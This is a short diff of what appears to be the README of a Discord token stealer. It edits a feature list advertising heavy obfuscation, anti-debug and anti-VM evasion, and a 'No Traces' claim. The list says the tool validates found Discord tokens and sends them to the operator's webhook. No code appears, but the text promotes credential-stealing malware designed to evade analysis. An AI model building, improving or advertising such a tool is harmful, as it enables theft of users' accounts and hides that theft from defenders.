@@ -109,9 +109,9 @@
 >
 > Ultra Obfuscation (use https://obfuscator.io)
 >
-> Anti-Debug
+> Anti-Debug / Anti-VM
 >
-> Anti-VM
+> No Traces
 >
 > Validates a found discord token and then sends it to your discord webhook
 >
